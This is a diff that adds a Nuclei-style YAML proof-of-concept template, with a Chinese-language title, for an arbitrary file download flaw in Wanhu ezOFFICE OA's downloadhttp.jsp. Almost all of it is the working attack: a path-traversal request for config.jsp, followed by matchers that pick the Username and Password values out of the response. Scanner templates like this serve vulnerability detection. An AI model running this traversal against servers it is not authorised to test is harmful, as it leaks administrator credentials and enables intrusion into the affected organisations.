@@ -1,0 +1,27 @@
+id: poc-yaml-wan-hu-ezoffice-downloadhttp-jsp-anyfile-download
+info:
+  name: 万户OA downloadhttp.jsp 任意文件下载漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 文件读取
+  metadata:
+    fingerprint: 万户OA ezoffice
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/defaultroot/site/templatemanager/downloadhttp.jsp?fileName=../public/edit/jsp/config.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<%"
+          - "Style ="
+      - type: regex
+        part: body
+        regex:
+          - "Username = \".*?\""
+          - "Password = \".*?\""
